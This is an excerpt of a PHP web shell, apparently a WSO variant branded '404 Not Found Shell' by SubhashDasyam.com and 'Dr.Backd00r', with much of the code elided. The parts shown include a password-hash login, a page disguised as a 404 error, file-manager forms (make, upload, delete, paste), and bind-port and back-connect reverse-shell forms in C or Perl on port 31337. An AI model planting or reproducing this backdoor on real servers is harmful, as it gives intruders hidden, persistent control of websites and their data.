...
/*Subhashdasyam.com*/
$auth_pass = "a28678a9fe5f0b45eafe8a55da8c07f5";
$color = "#00ff00";
...
?>
    ...
    <head>
        ...
        <title><?= $_SERVER['HTTP_HOST'] ?>- 404 Not Found Shell V.<?= VERSION ?>-SubhashDasyam.com</title>
        <style>
            body {
        ...
        <body>
            ...
            <table class=info id=toolsTbl cellpadding=0 cellspacing=0 width=100%">
                ...
                <tr>
                    <td>
                        <form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form><?= $is_writable ?>
                    </td>
                    <td>
                        <form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form><?= $is_writable ?>
                    </td>
                </tr>
                <tr>
                    <td>
                    ...
                    <td>
                        <form method='post' ENCTYPE='multipart/form-data'>
                            ...
                            <input type=hidden name=charset value='<?= isset($_POST['charset']) ? $_POST['charset'] : '' ?>'>
                            <span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>">
                        </form><?= $is_writable ?>
                    </td>
                </tr>
            ...
            <tr>
                <td colspan=7>
                    ...
                    <select name='p1'>
                        ...
                        <option value='delete'>Delete</option><?php if (!empty($_SESSION['act']) && @count($_SESSION['f'])) { ?><option value='paste'>Paste</option><?php } ?>
        ...
        <form name="sf" method="post">
            ...
            <div class=content>
                <form name='nfp' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;">
                    ...
                    Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select name="using">
                        <option value='bpc'>C</option>
                        <option value='bpp'>Perl</option>
                    </select> <input type=submit value=">>">
                </form>
                <form name='nfp' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;">
                    <span>Back-connect to</span><br />
                    Server: <input type='text' name='server' value='<?= $_SERVER['REMOTE_ADDR'] ?>'> Port: <input type='text' name='port' value='31337'> Using: <select name="using">
                        <option value='bcc'>C</option>
                        <option value='bcp'>Perl</option>
                    </select> <input type=submit value=">>">
                </form><br>
            <?php
                if (isset($_POST['p1'])) {
            ...
            ?>
            <div id="cot_tl_fixed">
                <marquee>Shell - *Dr.Backd00r* - SubhashDasyam.com</marquee>
            </div>
            </marquee>
            </div>